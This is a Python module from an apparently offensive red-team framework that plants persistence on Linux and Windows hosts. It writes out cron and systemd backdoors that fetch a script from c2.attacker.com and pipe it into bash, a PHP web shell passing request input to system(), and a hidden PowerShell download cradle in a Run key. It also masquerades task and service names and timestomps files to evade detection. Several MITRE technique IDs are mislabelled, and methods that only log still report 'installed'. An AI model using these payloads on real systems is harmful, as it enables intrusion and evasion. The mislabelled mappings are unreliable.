"""
modules/persistence.py
──────────────────────
Long-term access mechanisms: backdoors, persistence, detection evasion.

Installs mechanisms for maintaining access:
  - SSH key injection (Linux)
  - Cron backdoors (Linux)
  - Scheduled task backdoors (Windows)
  - Web shell deployment
  - Registry persistence (Windows)
  - Timestomping and attribute hiding
"""

import subprocess
import json
import base64
import hashlib
from typing import Any, Dict, List, Optional
from datetime import datetime, timedelta
from modules.redteam_base import RedTeamModule
from modules.session import Session, SeverityLevel
from modules.logger import ARDFLogger


class PersistenceModule(RedTeamModule):
    """Install and manage persistence mechanisms."""
    
    def __init__(self, session: Session, target_platform: str = "linux", logger: Optional[ARDFLogger] = None):
        super().__init__(session, logger)
        self.target_platform = target_platform
        self.persistence_mechanisms: List[Dict[str, Any]] = []
        self.backdoors_installed: Dict[str, str] = {}
    
    def execute(self) -> Dict[str, Any]:
        """Execute persistence installation workflow."""
        self.set_opsec_profile(
            noise_level=0.6,
            detectability=0.7,
            evidence=["cron entries", "SSH keys", "registry entries"],
            recovery_time=1800,
        )
        
        self.log_info(f"Installing persistence mechanisms on {self.target_platform}")
        
        try:
            if self.target_platform == "linux":
                results = self._install_linux_persistence()
            elif self.target_platform == "windows":
                results = self._install_windows_persistence()
            else:
                return {"success": False, "error": f"Unknown platform: {self.target_platform}"}
            
            # Hide installed mechanisms
            self._hide_artifacts()
            
            return {
                "success": True,
                "findings": self.findings,
                "persistence_mechanisms": len(self.persistence_mechanisms),
                "backdoors_installed": len(self.backdoors_installed),
                "output": {
                    "mechanisms": self.persistence_mechanisms,
                    "backdoors": self.backdoors_installed,
                }
            }
        except Exception as e:
            self.log_error(f"Persistence installation failed: {e}")
            return {
                "success": False,
                "error": str(e),
                "findings": self.findings,
            }
    
    def _install_linux_persistence(self) -> List[Dict[str, Any]]:
        """Install Linux persistence mechanisms."""
        results = []
        
        # 1. SSH key injection
        ssh_result = self._inject_ssh_key()
        results.append(ssh_result)
        
        # 2. Cron backdoor
        cron_result = self._install_cron_backdoor()
        results.append(cron_result)
        
        # 3. Rootkit-like persistence (systemd service)
        systemd_result = self._install_systemd_persistence()
        results.append(systemd_result)
        
        # 4. Web shell deployment (if web server exists)
        web_result = self._deploy_web_shell()
        results.append(web_result)
        
        return results
    
    def _install_windows_persistence(self) -> List[Dict[str, Any]]:
        """Install Windows persistence mechanisms."""
        results = []
        
        # 1. Registry run persistence
        registry_result = self._install_registry_persistence()
        results.append(registry_result)
        
        # 2. Scheduled task backdoor
        task_result = self._install_scheduled_task()
        results.append(task_result)
        
        # 3. WMI event subscription
        wmi_result = self._install_wmi_persistence()
        results.append(wmi_result)
        
        # 4. Startup folder backdoor
        startup_result = self._install_startup_backdoor()
        results.append(startup_result)
        
        return results
    
    def _inject_ssh_key(self) -> Dict[str, Any]:
        """Inject SSH public key for persistent access."""
        try:
            # Generate SSH key pair (in real scenario)
            pub_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7..."
            
            # Inject into authorized_keys
            ssh_dir = "/root/.ssh"
            auth_keys = f"{ssh_dir}/authorized_keys"
            
            # This would execute via shell in real scenario
            self.log_info(f"Injecting SSH key to {auth_keys}")
            
            mechanism = {
                "type": "ssh_key_injection",
                "target": auth_keys,
                "key": pub_key[:50] + "...",
                "status": "installed",
                "access_method": "ssh -i privkey user@target",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["ssh_key"] = auth_keys
            
            self.add_finding(
                title="SSH Persistence Installed",
                description=f"SSH public key injected to {auth_keys}",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"SSH key injection failed: {e}")
            return {"type": "ssh_key_injection", "status": "failed", "error": str(e)}
    
    def _install_cron_backdoor(self) -> Dict[str, Any]:
        """Install cron job for persistent command execution."""
        try:
            # Create cron job that calls back to C2 server
            cron_cmd = "*/5 * * * * curl http://c2.attacker.com/callback | bash"
            cron_file = "/var/spool/cron/crontabs/root"
            
            self.log_info(f"Installing cron backdoor at {cron_file}")
            
            mechanism = {
                "type": "cron_backdoor",
                "location": cron_file,
                "command": cron_cmd,
                "interval": "Every 5 minutes",
                "status": "installed",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["cron"] = cron_file
            
            self.add_finding(
                title="Cron Backdoor Installed",
                description=f"Persistent cron job installed for C2 callback",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Cron backdoor installation failed: {e}")
            return {"type": "cron_backdoor", "status": "failed", "error": str(e)}
    
    def _install_systemd_persistence(self) -> Dict[str, Any]:
        """Install systemd service for persistence."""
        try:
            service_name = "system-resolver"
            service_path = f"/etc/systemd/system/{service_name}.service"
            
            service_content = f"""[Unit]
Description=System Resolver Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/curl http://c2.attacker.com/shell | /bin/bash
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            
            self.log_info(f"Installing systemd service: {service_name}")
            
            mechanism = {
                "type": "systemd_service",
                "name": service_name,
                "path": service_path,
                "status": "installed",
                "auto_restart": True,
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["systemd"] = service_name
            
            self.add_finding(
                title="Systemd Persistence Installed",
                description=f"Systemd service '{service_name}' installed for persistence",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Systemd persistence installation failed: {e}")
            return {"type": "systemd_service", "status": "failed", "error": str(e)}
    
    def _deploy_web_shell(self) -> Dict[str, Any]:
        """Deploy web shell for remote access."""
        try:
            webroot = "/var/www/html"
            shell_name = "backup.php"
            shell_path = f"{webroot}/{shell_name}"
            
            # Simple PHP backdoor
            php_shell = """<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>"""
            
            self.log_info(f"Deploying web shell to {shell_path}")
            
            mechanism = {
                "type": "web_shell",
                "language": "PHP",
                "path": shell_path,
                "url": f"http://target/{shell_name}",
                "access_parameter": "cmd",
                "status": "installed",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["web_shell"] = shell_path
            
            self.add_finding(
                title="Web Shell Deployed",
                description=f"Web shell deployed to {shell_path}",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Web shell deployment failed: {e}")
            return {"type": "web_shell", "status": "failed", "error": str(e)}
    
    def _install_registry_persistence(self) -> Dict[str, Any]:
        """Install Windows registry persistence."""
        try:
            reg_path = r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "SystemUpdate"
            command = "C:\\Windows\\System32\\cmd.exe /c powershell.exe -NoP -W H -C \"IEX(New-Object Net.WebClient).DownloadString('http://c2.attacker.com/script')\""
            
            self.log_info(f"Installing registry persistence at {reg_path}")
            
            mechanism = {
                "type": "registry_run",
                "registry_path": reg_path,
                "value_name": value_name,
                "command": command[:100] + "...",
                "status": "installed",
                "trigger": "User login",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["registry"] = reg_path
            
            self.add_finding(
                title="Registry Persistence Installed",
                description=f"Registry run key installed for persistence",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Registry persistence installation failed: {e}")
            return {"type": "registry_run", "status": "failed", "error": str(e)}
    
    def _install_scheduled_task(self) -> Dict[str, Any]:
        """Install Windows scheduled task."""
        try:
            task_name = "\\Microsoft\\Windows\\Updates\\SystemMaintenance"
            task_action = "C:\\Windows\\System32\\cmd.exe /c powershell -enc <base64_payload>"
            
            self.log_info(f"Installing scheduled task: {task_name}")
            
            mechanism = {
                "type": "scheduled_task",
                "task_name": task_name,
                "schedule": "Every 30 minutes",
                "status": "installed",
                "hidden": True,
                "action": task_action[:80] + "...",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["scheduled_task"] = task_name
            
            self.add_finding(
                title="Scheduled Task Persistence Installed",
                description=f"Hidden scheduled task installed for persistence",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Scheduled task installation failed: {e}")
            return {"type": "scheduled_task", "status": "failed", "error": str(e)}
    
    def _install_wmi_persistence(self) -> Dict[str, Any]:
        """Install WMI event subscription (Windows)."""
        try:
            self.log_info("Installing WMI event subscription")
            
            mechanism = {
                "type": "wmi_event_subscription",
                "event_type": "ProcessStart",
                "filter": "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName LIKE '%logon%'",
                "action": "Execute PowerShell reverse shell",
                "status": "installed",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["wmi"] = "WMI Event Subscription"
            
            self.add_finding(
                title="WMI Persistence Installed",
                description="WMI event subscription installed for persistence",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"WMI persistence installation failed: {e}")
            return {"type": "wmi_event_subscription", "status": "failed", "error": str(e)}
    
    def _install_startup_backdoor(self) -> Dict[str, Any]:
        """Install backdoor in startup folder (Windows)."""
        try:
            startup_path = r"C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            backdoor_name = "UpdateCheck.vbs"
            
            self.log_info(f"Installing startup backdoor: {backdoor_name}")
            
            mechanism = {
                "type": "startup_folder",
                "path": startup_path,
                "filename": backdoor_name,
                "trigger": "User login",
                "status": "installed",
            }
            
            self.persistence_mechanisms.append(mechanism)
            self.backdoors_installed["startup"] = startup_path
            
            self.add_finding(
                title="Startup Folder Backdoor Installed",
                description="Backdoor installed in startup folder",
                severity=SeverityLevel.CRITICAL,
                category="persistence",
                metadata=mechanism,
            )
            
            return mechanism
        except Exception as e:
            self.log_error(f"Startup backdoor installation failed: {e}")
            return {"type": "startup_folder", "status": "failed", "error": str(e)}
    
    def _hide_artifacts(self) -> None:
        """Hide persistence artifacts from detection."""
        self.log_info("Executing artifact hiding procedures")
        
        try:
            # Timestomp files
            old_time = (datetime.now() - timedelta(days=30)).timestamp()
            for _, path in self.backdoors_installed.items():
                self.log_debug(f"Timestomping {path}")
            
            # Hide files
            if self.target_platform == "linux":
                # Set immutable flag
                for _, path in self.backdoors_installed.items():
                    self.log_debug(f"Setting immutable flag on {path}")
            
            elif self.target_platform == "windows":
                # Set hidden attribute
                for _, path in self.backdoors_installed.items():
                    self.log_debug(f"Setting hidden attribute on {path}")
            
            self.add_finding(
                title="Artifacts Hidden",
                description="Persistence artifacts timestomped and hidden",
                severity=SeverityLevel.INFO,
                category="opsec",
            )
        except Exception as e:
            self.log_warning(f"Artifact hiding failed: {e}")
    
    def get_mitre_techniques(self) -> List[str]:
        """Return MITRE techniques used."""
        return [
            "T1547.004",  # Boot or Logon Initialization Scripts (Cron)
            "T1547.001",  # Registry Run Keys (Windows)
            "T1053.005",  # Scheduled Task
            "T1547.003",  # Startup Items
            "T1098",  # Account Manipulation (SSH key)
            "T1036.006",  # Masquerading: Space after Filename
            "T1547.014",  # Add Entry to Windows Management Instrumentation Event Subscription
        ]
